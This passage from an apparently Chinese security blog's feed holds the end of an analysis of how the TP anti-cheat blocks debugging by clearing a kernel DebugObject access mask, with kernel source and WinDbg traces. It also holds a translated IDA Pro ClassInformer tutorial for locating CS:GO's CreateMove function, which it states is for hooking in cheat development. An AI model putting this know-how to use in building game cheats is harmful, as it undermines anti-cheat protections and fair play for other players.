class="line">    <span class="keyword">if</span> (Process == PsGetCurrentProcess () || Process == PsInitialSystemProcess) &#123;</span><br><span class="line">        ObDereferenceObject (Process);</span><br><span class="line">        <span class="keyword">return</span> STATUS_ACCESS_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line">    Status = ObReferenceObjectByHandle (DebugObjectHandle,</span><br><span class="line">                                        DEBUG_PROCESS_ASSIGN,</span><br><span class="line">                                        DbgkDebugObjectType,</span><br><span class="line">                                        PreviousMode,</span><br><span class="line">                                        &amp;DebugObject,</span><br><span class="line">                                        <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (NT_SUCCESS (Status)) &#123;</span><br><span class="line">        <span class="comment">// We will be touching process address space. Block process rundown.</span></span><br><span class="line">        <span class="keyword">if</span> (ExAcquireRundownProtection (&amp;Process-&gt;RundownProtect)) &#123;</span><br><span class="line">            <span class="comment">// Post the fake process create messages etc.</span></span><br><span class="line">            Status = DbgkpPostFakeProcessCreateMessages (Process,</span><br><span class="line">                                                         DebugObject,</span><br><span class="line">                                                         &amp;LastThread);</span><br><span class="line">            <span class="comment">// Set the debug port. If this fails it will remove any faked messages.</span></span><br><span class="line">            Status = DbgkpSetProcessDebugObject (Process,</span><br><span class="line">                                                 DebugObject,</span><br><span class="line">                                                 Status,</span><br><span class="line">                                                 LastThread);</span><br><span class="line">            ExReleaseRundownProtection (&amp;Process-&gt;RundownProtect);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Status = STATUS_PROCESS_IS_TERMINATING;</span><br><span class="line">        &#125;</span><br><span class="line">        ObDereferenceObject (DebugObject);</span><br><span class="line">    &#125;</span><br><span class="line">    ObDereferenceObject (Process);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过双机调试及相关资料，可以找到ValidAccessMask被清零后调试失败的具体代码位置在NtDebugActiveProcess函数中，在NtDebugActiveProcess函数中会通过ObReferenceObjectByHandle对传入的DebugObjectHandle对象句柄的访问权限进行检查，需要DEBUG_PROCESS_ASSIGN权限，但ValidAccessMask被清零后创建的DebugObject没有DEBUG_PROCESS_ASSIGN权限，函数会返回c0000022错误。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; bu nt!NtCreateDebugObject+0x86</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">nt!NtCreateDebugObject+0x86:</span><br><span class="line">fffff800`02ebce26 e8b5bef1ff      call    nt!ObCreateObject (fffff800`02dd8ce0)</span><br><span class="line">kd&gt; .process</span><br><span class="line">Implicit process is now fffffa80`03904b30</span><br><span class="line">kd&gt; .process fffffa80`03904b30</span><br><span class="line">Implicit process is now fffffa80`03904b30</span><br><span class="line">WARNING: .cache forcedecodeuser is not enabled</span><br><span class="line">kd&gt; kv</span><br><span class="line">Child-SP          RetAddr           : Args to Child                                                           : Call Site</span><br><span class="line">fffff880`04ef9b60 fffff800`02ade8d3 : fffffa80`03782b60 00000000`001f000f 00000000`00000000 00000000`00000001 : nt!NtCreateDebugObject+0x95</span><br><span class="line">fffff880`04ef9be0 00000000`77541c4a : 00000000`73d1ebdd 00000000`0059f658 00000000`001f000f 00000000`020eec20 : nt!KiSystemServiceCopyEnd+0x13 (TrapFrame @ fffff880`04ef9be0)</span><br><span class="line">00000000`020ee368 00000000`73d1ebdd : 00000000`0059f658 00000000`001f000f 00000000`020eec20 00000000`020ee350 : ntdll!ZwCreateDebugObject+0xa</span><br><span class="line">00000000`020ee370 00000000`73d0cf87 : 00000000`00000000 00000000`00000000 00000000`020eec20 00000000`01fbf9b4 : wow64!whNtCreateDebugObject+0x6d</span><br><span class="line">00000000`020ee3c0 00000000`73c92776 : 00000000`752e60e2 00000000`00000023 00000000`00000246 00000000`01fbfab4 : wow64!Wow64SystemServiceEx+0xd7</span><br><span class="line">00000000`020eec80 00000000`73d0d07e : 00000000`00000000 00000000`73c91920 00000000`00000000 00000000`00000000 : wow64cpu!TurboDispatchJumpAddressEnd+0x2d</span><br><span class="line">00000000`020eed40 00000000`73d0c549 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : wow64!RunCpuSimulation+0xa</span><br><span class="line">00000000`020eed90 00000000`7756e707 : 00000000`00000000 00000000`fffdf000 00000000`fffd8000 00000000`00000000 : wow64!Wow64LdrpInitialize+0x429</span><br><span class="line">00000000`020ef2e0 00000000`7751c32e : 00000000`020ef3a0 00000000`00000000 00000000`fffdf000 00000000`00000000 : ntdll! ?? ::FNODOBFM::`string'+0x29364</span><br><span class="line">00000000`020ef350 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!LdrInitializeThunk+0xe</span><br><span class="line">.....</span><br><span class="line">Breakpoint 4 hit</span><br><span class="line">nt!NtDebugActiveProcess+0x100:</span><br><span class="line">fffff800`02f2d2f0 e8ebc5e8ff      call    nt!ObReferenceObjectByHandle (fffff800`02db98e0)</span><br><span class="line">kd&gt; p</span><br><span class="line">nt!NtDebugActiveProcess+0x105:</span><br><span class="line">fffff800`02f2d2f5 8bf8            mov     edi,eax</span><br><span class="line">kd&gt; r rax</span><br><span class="line">rax=00000000c0000022</span><br></pre></td></tr></table></figure>
<h2 id="0x03_简单总结">0x03 简单总结</h2><ul>
<li>Debugobject是一个对调试很重要的一个结构体，用于支持用户模式调试。</li>
<li>Debugobject创建过程中会依赖一个名为DbgkDebugObjectType的内核全局变量，通过修改这个全局变量可以影响调试过程的创建，并且影响是全局的，对所有进程有效。</li>
<li>TP通过将DbgkDebugObjectType.TypeInfo.ValidAccessMask清零达到反调目的，可能也是无奈之举毕竟X64的PatchGuard让在内核中能干的事越来越少，至于为什么修改ValidAccessMask不会触发PatchGuard可能DbgkDebugObjectType现在还没纳入PatchGuard保护范围。</li>
<li>代码可以参考<a href="https://gist.github.com/geemion/b61aa49e1b19dc8421b953ec3939fa4f" target="_blank" rel="external">https://gist.github.com/geemion/b61aa49e1b19dc8421b953ec3939fa4f</a></li>
</ul>
<h2 id="0x04_参考资料">0x04 参考资料</h2><ul>
<li>[1] 深入解析Windows操作系统</li>
<li>[2] WRK1.2</li>
<li>[3] <a href="https://github.com/jilinxiaohuo/VaildAccessMask" target="_blank" rel="external">VaildAccessMask</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_什么是DebugObject">0x00 什么是DebugObject</h2><p>在Windows系统中对调试的支持主要在三个模块中，分别为内核执行体（多核处理器一般为ntkrnlmp.exe,以Dbgk为前缀,主要负责注册和监听调试事件、管理调试对象等）、原生系统库ntdll.dll（DbgUi为前缀，负责将底层的调试对象封装起来）、子系统dll（kernelbase.dll）。而调试对象（DebugObject）是一个结构体，支持用户模式调试，由一系列的标志（决定对象的状态）、一个事件、一个调试事件双链表组成。<br>]]>
    
    </summary>
    
      <category term="Windows" scheme="http://www.youngroe.com/tags/Windows/"/>
    
      <category term="内核结构" scheme="http://www.youngroe.com/tags/%E5%86%85%E6%A0%B8%E7%BB%93%E6%9E%84/"/>
    
      <category term="权限" scheme="http://www.youngroe.com/tags/%E6%9D%83%E9%99%90/"/>
    
      <category term="Kernel" scheme="http://www.youngroe.com/categories/Kernel/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[IDA Pro ClassInformer使用指南（翻译）]]></title>
    <link href="http://www.youngroe.com/2017/10/23/Tools/IDA-Pro-ClassInformer-Tutorial/"/>
    <id>http://www.youngroe.com/2017/10/23/Tools/IDA-Pro-ClassInformer-Tutorial/</id>
    <published>2017-10-23T09:55:21.000Z</published>
    <updated>2020-05-17T13:03:16.691Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_介绍">0x00 介绍</h2><p>本文主要针对几乎没有使用IDA Pro经验及逆向水平一般的人。IDA对初学者还是有一定的门槛的，主要是由于IMO没有详细介绍IDA使用环境设置和插件使用的指南。我的目标是展示当我在客户端（这里应该是开发外挂）开发遇到困难的时候，我是如何解决这个问题的方法和策略。在本指南中我将演示如何从SDK中的一个字符串识别出二进制文件中反汇编代码中的函数。目标是将IDA中原始的汇编代码转换为ClientMode::CreateMove函数。<br><a id="more"></a></p>
<h2 id="0x01_例子">0x01 例子</h2><p>在开始之前，下面是一个能直观展示IDA强大功能的例子。这是两张图片但都是steamclient.dll中同一个函数反汇编后的结果，第一张图片是原始的反汇编代码，第二张是相同函数反汇编结果但是经过人工逆向解析。</p>
<div align="center"><br><img src="/img/idaclassinformer1.png" alt align="center"><br></div>

<div align="center"><br><img src="/img/idaclassinformer2.png" alt align="center"><br></div>

<p>使用IDA逆向就像解决成千上万个难题一样。未命名的全局变量（dword_X）和函数（sub_Y）就像拼图碎片。在逆向过程中识别全局变量和函数会对整个逆向过程产生连锁反应。举例说明下，当你逆向一个函数时识别出了全局变量g_pGlobals,然后你将变量名从dword_Z重命名为g_PGlobals。现在模块中访问此变量的所有函数中都会使用g_pGlobals这个名称。如果你想知道一个使用g_pGlobals变量函数的作用，那么你又将需要逆向一个函数。<br>逆向出来的越多，后面逆向会更容易，这将会很有成就感，这种成就感会让你上瘾，停不下来。</p>
<h2 id="0x02_准备工作">0x02 准备工作</h2><p>开始之前，我建议你安装下载如下工具：<br><strong>IDA</strong>:</p>
<ul>
<li><a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="external">IDA Professional</a>:免费版本的IDA Pro</li>
<li><a href>Class Informer</a>:由Sirmabus开发的开源一款IDA插件，通过RTTI信息解析汇编代码重构类信息。</li>
<li><a href>Function String Associate</a>：由Sirmabus开发的开源IDA插件，将函数中引用的字符生成函数的注释。</li>
</ul>
<p><strong>其他</strong></p>
<ul>
<li><a href="https://github.com/ValveSoftware/source-sdk-2013" target="_blank" rel="external">SDK 2013</a>:库中的本地保存的副本</li>
<li>Leaked 2007 SDK：通过论坛中搜索下载</li>
<li><a href="http://www.mingw.org/wiki/msys" target="_blank" rel="external">Mingw MSYS</a>: 你可以从SDK库中获得<a href="http://www.mingw.org/wiki/msys" target="_blank" rel="external">http://www.mingw.org/wiki/msys</a></li>
</ul>
<h2 id="0x03_设置IDA环境">0x03 设置IDA环境</h2><p>每个客户端(应该是外挂程序)都需要hook CreateMove去改变用户命令，并且Hook clientMode模块的函数是最好的因为不需要像Hook CHLClient模块之后还需要修复CRC校验值，我们猜测ClientMode类是在CS:GO客户端模块中定义的。使用IDA打开CS:GO游戏模块client.dll。将该文件拖入IDA你将会看到下图所示界面：</p>
<div align="center"><br><img src="/img/idaclassinformer3.png" alt align="center"><br></div>

<p>我们需要关注“Manual load”这个选项，选中它将会有一系列的提示，提醒我是否需要反汇编/解析模块的某些部分。</p>
<div align="center"><br><img src="/img/idaclassinformer4.png" alt align="center"><br></div><br>第一个提示是设置模块基地址，将其设置为0，以便从相对地址从0开始。<br><div align="center"><br><img src="/img/idaclassinformer5.png" alt align="center"><br></div><br>接下来一系列提示会询问我们是否分析某些模块，一直选择”Yes”直到提示是否加载.pdb文件：<br><div align="center"><br><img src="/img/idaclassinformer6.png" alt align="center"><br></div><br>因为我们没有pdb，所以选择“No”。现在IDA会花一些时间完成反汇编。当左下脚信息栏显示“AU:idle”时，说明IDA已经完成了分析：<br><div align="center"><br><img src="/img/idaclassinformer7.png" alt align="center"><br></div><br>现在看到的是IDA反汇编程序的关键部分，IDA View-A选项卡是client.dll的完整反汇编代码。IDA递归的反编译原始二进制为asm汇编文件。<br>首选我们需要设置几个默认选项以显示一些默认情况下不显示的有用信息，通过点击菜单栏“Options-&gt;General”进行设置，下面我会对我已经设置的选项进行说明。<br><div align="center"><br><img src="/img/idaclassinformer8.png" alt align="center"><br></div><br>1.这是主要的不同。设置后在左边的地址显示会被改变，改变后的地址会变成如’sub_7E0CB7+offset’的形式，而不是默认的’.text:0035235A’。<br>2.设置后会在地址显示的右侧增加一个3位数值，可以通过函数跟踪当前栈指针的值。<br>3.该选项会为所有的汇编操作指令生成简单的注释，如果你对汇编不熟悉，可能会有帮助。但当你熟悉常见的汇编指令后，你会想要禁用该选项，因为这些评论可能会扰乱IDA的反汇编显示。<br>4.该选项表示指令和左边显示栏的宽度。这纯粹是个人喜好，我喜欢小数字因为减少了死角。<br><br>## 0x04 识别ClientMode::CreateMove函数<br>现在我们准备好开始逆向了，我们从启动Class Informer开始。在目录栏选择“Edit-&gt;Plugins-&gt;Class Informer”。如果你没有发现这个选项可能是你没有安装插件到正常的目录（安装插件后记得重启IDA）。你会看到下面这个默认界面弹出，然后点击”CONTINUE“继续。<br><div align="center"><br><img src="/img/idaclassinformer9.png" alt align="center"><br></div><br>Class Informer将会解析反汇编的RTTI。如果还没有阅读<a href="http://www.openrce.org/articles/full_view/23" target="_blank" rel="external">OpenRCE关于RTTI的文章</a>，请马上去看一下。RTTI是非常重要的，这是Class Informer插件实现的基础。如果解析完成，会在IDA上弹出一个新的选项卡。<br><div align="center"><br><img src="/img/idaclassinformer10.png" alt align="center"><br></div><br>[Class Informer]选项卡（图中用黄色框勾选），Vftable:类的RTTI在反汇编中的地址。Methods:该类虚函数的个数。Flag:’M’意味这个类有多重继承。Type:类的名称，通常和SDK中定义的有相同的类名。Hierarchy:该类继承的类名称的列表。<br>点击列表中任何一个类将转到汇编窗口中该类的虚函数列表。搜索“ClientMode”,将会有很多结果，因为“ClientMode”也是其他类名称的子字符串，向下滚动直到找到“IClientMode”函数：<br><div align="center"><br><img src="/img/idaclassinformer11.png" alt align="center"><br></div><br>这里有一个问题，我们在向下滚动时会看到ClientMode的抽象类及该类的几个派生类。我们如何确定哪一个类的虚表包含我们想要hook的CreateMove函数呢？<br>在sdk中搜索！打开命令行，通过cd命令切换到2013 SDK目录。然后执行下面的命令：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -lir <span class="string">"::CreateMove"</span></span><br></pre></td></tr></table></figure><br><br>-l:查询多文件时只输出包含匹配字符的文件名,-i:忽略大小写,-r:递归搜索。执行该命令后将打印类或命名空间中定义了CreateMove的文件名。<br>输出类似下面的：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./src/game/client/cdll_client_int.cpp</span><br><span class="line">./src/game/client/clientmode_shared.cpp</span><br><span class="line">./src/game/client/c_baseplayer.cpp</span><br><span class="line">./src/game/client/hl2/c_basehlplayer.cpp</span><br><span class="line">./src/game/client/hl2/hl2_clientmode.cpp</span><br><span class="line">./src/game/client/hltvcamera.cpp</span><br><span class="line">./src/game/client/in_main.cpp</span><br><span class="line">./src/game/client/replay/replaycamera.cpp</span><br><span class="line">./src/game/server/ai_basenpc.cpp</span><br><span class="line">./src/game/shared/weapon_ifmsteadycam.cpp</span><br></pre></td></tr></table></figure><br><br>clientmode_shared.cpp很可能是我们要找的，打开这个文件，搜索”::CreateMove“定位到定义的位置：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> ClientModeShared::CreateMove( <span class="keyword">float</span> flInputSampleTime, CUserCmd *cmd )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Let the player override the view.</span></span><br><span class="line">    C_BasePlayer *pPlayer = C_BasePlayer::GetLocalPlayer();</span><br><span class="line">    <span class="keyword">if</span>(!pPlayer)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Let the player at it</span></span><br><span class="line">    <span class="keyword">return</span> pPlayer-&gt;CreateMove( flInputSampleTime, cmd );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>ClientModeShared肯定是要找的类，但是在ClassInformer选项卡中有两行都是ClientModeShared。这种情况主要是由于ClientModeShared类使用了多重继承的原因（注意M标志）。通过分析clientmode_shared.h中类的继承结构定义我们可以确定有57个函数的类是我们要找的类。双击所在的行直接转到ClientModeShared虚表：<br><div align="center"><br><img src="/img/idaclassinformer12.png" alt align="center"><br></div><br>现在的位置是一个可点击的函数指针列表，点击任何黄色字段都会跳转到该函数实现的位置。nullsub_X表示该函数没有实现，有很多原因都会造成这种情况但现在这些都不重要。我们的目标是确定哪一个函数是CreateMove.Function String Associate插件会使这个任务更加容易。和执行Class Informer插件一样在目录中执行Function String Associate插件，选择”Continue“在命令行中，IDA显示应该会像下面一样：<br><div align="center"><br><img src="/img/idaclassinformer13.png" alt align="center"><br></div><br>右边空白处的注释是该行函数引用的字符串。如你双击”sub_2694A0“你将会看到<code>LevelInit</code>, <code>game_newmap&#39;和</code>mapname`在该函数的实现中使用。 当我们对一个虚函数表进行分析的时候，需要确定一些函数，我们可以通过比较SDK进行参考。我们来看一下能不能通过这三个字符串找到这个函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd <span class="number">2013</span>_SDK_src</span><br><span class="line">grep -lir game_newmap .</span><br></pre></td></tr></table></figure><br><br>输出如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./src/game/client/clientmode_shared.cpp</span><br><span class="line">./src/game/client/game_controls/basemodelpanel.cpp</span><br><span class="line">./src/game/client/game_controls/baseviewport.cpp</span><br><span class="line">./src/game/client/game_controls/MapOverview.cpp</span><br><span class="line">./src/game/client/hltvcamera.cpp</span><br><span class="line">./src/game/client/playerspawncache.cpp</span><br><span class="line">./src/game/client/replay/replaycamera.cpp</span><br></pre></td></tr></table></figure><br><br>我们可以根据这个结果继续进行分析。打开clientmode_shared.cpp搜索’game_newmap‘,可以找到3个结果，只有在函数ClientModeShared::LevelInit有出现使用。双击函数sub_2694A0,可以在IDA中看到这个函数的定义，你会看到如下内容，部分相关信息我已经标出来了：<br><div align="center"><br><img src="/img/idaclassinformer14.png" alt align="center"><br></div><br>- 1.IDA在函数的开头声明函数的参数和每个局部变量，IDA已经确定这个函数有一个4字节的（dword ptr 8）参数（arg_0）。8表示该变量在EBP+8(返回地址在EBP+4)。不过也需要注意IDA可能无法正确分析出函数参数数量和参数的大小。<br>- 2.这是一个字符串引用。表示该行会访问全局字符串变量”LevelInit“。除了IDA自动根据字符串内容重命名的的字符串，其他情况下字符串变量的名称为”dword_x“。<br>如果你有hexrays,将鼠标停留在函数体中然后按’F1‘(默认反编译快捷键)，你会看到一个包含C代码的新页面。你可以通过在空白处右键然后取消选中”Show Casts“来清除它。下面是你将会看到的注释：<br><div align="center"><br><img src="/img/idaclassinformer15.png" alt align="center"><br></div><br>- 1.函数定义有两个参数。IDA会将类表示为显示指针的结果，如果一个函数是类的成员函数，第一个参数是指向类实例的指针，即this指针，a2才是真正的第一个参数。<br>- 2.局部变量声明。如果IDA在模块某些部分分析出现错误，这里的结果可能是不精确的，某些变量可能是重复、错误大小或则类型等。你需要及时学会去识别和修复这些错误。<br>- 3.这是虚函数调用在反编译中的形式。你可以分解者一样代码：v4=(<em>(</em>v3+156))(v3);(<em>v3 + 156):v3是一个将要被解引的一个指针然后加上156。如果v3是一个多态对象，这个表达式就是计算第39个虚函数的地址。(</em>v3::method_39)(v3)这就是一个函数调用。解引用这个函数指针并将类的实例对象作为唯一的参数。由于IDA会显式显示C++类指针，因此此函数真实的参数是0个。v4是函数调用后返回的结果，v3::method_39函数的返回值。<br>- 4.只要你看到一个前缀是一个数据类型的变量，那么表示该变量是一个全家变量（可能是静态或则是一个声明的全局变量）。’dword‘前缀表示这个变量是一个4字节变量。在源代码中声明的形式可能是：static int g_iState;//在函数体外声明。<br>和sdk中的函数对比：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> ClientModeShared::LevelInit( <span class="keyword">const</span> <span class="keyword">char</span> *newmap )</span><br><span class="line">&#123;</span><br><span class="line">    m_pViewport-&gt;GetAnimationController()-&gt;StartAnimationSequence(<span class="string">"LevelInit"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Tell the Chat Interface</span></span><br><span class="line">    <span class="keyword">if</span> ( m_pChatElement )</span><br><span class="line">    &#123;</span><br><span class="line">        m_pChatElement-&gt;LevelInit( newmap );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// we have to fake this event clientside, because clients connect after that</span></span><br><span class="line">    IGameEvent *event = gameeventmanager-&gt;CreateEvent( <span class="string">"game_newmap"</span> );</span><br><span class="line">    <span class="keyword">if</span> ( event )</span><br><span class="line">    &#123;</span><br><span class="line">        event-&gt;SetString(<span class="string">"mapname"</span>, newmap );</span><br><span class="line">        gameeventmanager-&gt;FireEventClientSide( event );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a vgui context for all of the in-game vgui panels...</span></span><br><span class="line">    <span class="keyword">if</span> ( s_hVGuiContext == DEFAULT_VGUI_CONTEXT )</span><br><span class="line">    &#123;</span><br><span class="line">        s_hVGuiContext = vgui::ivgui()-&gt;CreateContext();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Reset any player explosion/shock effects</span></span><br><span class="line">    CLocalPlayerFilter filter;</span><br><span class="line">    enginesound-&gt;SetPlayerDSP( filter, <span class="number">0</span>, <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>函数结构几乎完全一致。这个未标记的函数肯定是ClientModeShared::LevelInit,点击’IDA View-A‘选项卡返回到汇编代码，将鼠标移动到函数”sub_2694a0“然后按键盘”N“重命名这个函数。<br><div align="center"><br><img src="/img/idaclassinformer16.png" alt align="center"><br></div><br>选择”Yes“忽略长文件名弹窗。然后返回到ClientModeShared的虚表。现在将LevelInit函数作为一个参考点，我喜欢在虚表中将函数的索引附加到函数。计算可得这个函数是虚函数表中的第25个函数（从0开始）。如果你会使用python，你可以将屏幕底部的窗口作为python解释器进行计算，如：<br><div align="center"><br><img src="/img/idaclassinformer17.png" alt align="center"><br></div><br>让我们开始使用这个参考函数。我们知道ClientModeShared继承自IClientMode抽象类和CGameEventListener类。我们正在处理的虚表代表的是IClientMode的继承。在Class Informer选项卡发现的另一个虚表是代表CGameEventListener。在iclientmode.h中CTRL+F搜索’LevelInit‘:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">virtual</span> vgui::<span class="function">Panel *<span class="title">GetMessagePanel</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span>    <span class="title">OverrideMouseInput</span><span class="params">( <span class="keyword">float</span> *x, <span class="keyword">float</span> *y )</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span>    <span class="title">CreateMove</span><span class="params">( <span class="keyword">float</span> flInputSampleTime, CUserCmd *cmd )</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span>    <span class="title">LevelInit</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *newmap )</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span>    <span class="title">LevelShutdown</span><span class="params">( <span class="keyword">void</span> )</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span>    <span class="title">ShouldDrawViewModel</span><span class="params">( <span class="keyword">void</span> )</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span>    <span class="title">ShouldDrawCrosshair</span><span class="params">( <span class="keyword">void</span> )</span> </span>= <span class="number">0</span>;</span><br></pre></td></tr></table></figure><br><br>我们知道虚函数时按照源文件中声明的顺序开始排序的。我们可以得出结论，CreateMove应该是LevelInit函数之前的函数。需要注意的是SDK通常不是最新的，函数的顺序可能不完全相同。你应该使用SDK作为一个简单的指南，去找到这些函数的引用。<br>返回IDA,双击函数指针”dd offset ClientModeShared__LevelInit”。我们可以通过比较IDA反汇编中参数的数量和SDK CreateMove函数原型是否一致，证明这就是CreateMove。hex view声明了两个与CreateMove原型匹配的函数参数，这看起来是有希望的。比较下ClientModeShared::CreateMove在sdk clientmode_shared.cpp中的声明是否和反编译的中的一致。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> ClientModeShared::CreateMove( <span class="keyword">float</span> flInputSampleTime, CUserCmd *cmd )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Let the player override the view.</span></span><br><span class="line">    C_BasePlayer *pPlayer = C_BasePlayer::GetLocalPlayer();</span><br><span class="line">    <span class="keyword">if</span>(!pPlayer)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Let the player at it</span></span><br><span class="line">    <span class="keyword">return</span> pPlayer-&gt;CreateMove( flInputSampleTime, cmd );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><div align="center"><br><img src="/img/idaclassinformer18.png" alt align="center"><br></div><br>找到了，切换到hex view然后重命名这个函数。<br><div align="center"><br><img src="/img/idaclassinformer19.png" alt align="center"><br></div>

<h2 id="0x05_最后致谢">0x05 最后致谢</h2><p>感谢<a href="https://www.unknowncheats.me/forum/members/171990.html" target="_blank" rel="external">@Sirmabus</a>开发了上面两个好用的插件：</p>
<ul>
<li>1.上面提到的方法不是找到函数CreateMove函数最简便最直观的方法</li>
<li>2.鼓励每个人发布他们自定义的环境并指出我的文章中的任何错误。</li>
</ul>
<h2 id="外部参考">外部参考</h2><ul>
<li>[1] <a href="https://www.unknowncheats.me/forum/counterstrike-global-offensive/148360-reversing-ida-walkthrough-finding-clientmode-createmove.html" target="_blank" rel="external">Original post “Reversing in IDA: a walkthrough for finding ClientMode::CreateMove” by qwerty9384</a></li>
<li>[2] <a href="https://github.com/ValveSoftware/source-sdk-2013" target="_blank" rel="external">ValveSoftware/source-sdk-2013 - GitHub</a></li>
<li>[3] IDA-Hex-Rays:<br>  -<a href="https://sourceforge.net/projects/classinformer/" target="_blank" rel="external">IDA ClassInformer Plugin - SourceForge</a><br>  -<a href="https://sourceforge.net/projects/idafunctionstringassociate/" target="_blank" rel="external">IDA FunctionStringAssociate PlugIn - SourceForge</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_介绍">0x00 介绍</h2><p>本文主要针对几乎没有使用IDA Pro经验及逆向水平一般的人。IDA对初学者还是有一定的门槛的，主要是由于IMO没有详细介绍IDA使用环境设置和插件使用的指南。我的目标是展示当我在客户端（这里应该是开发外挂）开发遇到困难的时候，我是如何解决这个问题的方法和策略。在本指南中我将演示如何从SDK中的一个字符串识别出二进制文件中反汇编代码中的函数。目标是将IDA中原始的汇编代码转换为ClientMode::CreateMove函数。<br>]]>
    
    </summary>
    
      <category term="IDA Pro" scheme="http://www.youngroe.com/tags/IDA-Pro/"/>
    
      <category term="Tools" scheme="http://www.youngroe.com/categories/Tools/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Kernel Data and Filtering Support for Windows Server 2008（翻译）]]></title>
    <link href="http://www.youngroe.com/2017/05/23/Windows/Kernel%20Data%20and%20Filtering%20Support/"/>
    <id>http://www.youngroe.com/2017/05/23/Windows/Kernel Data and Filtering Support/</id>
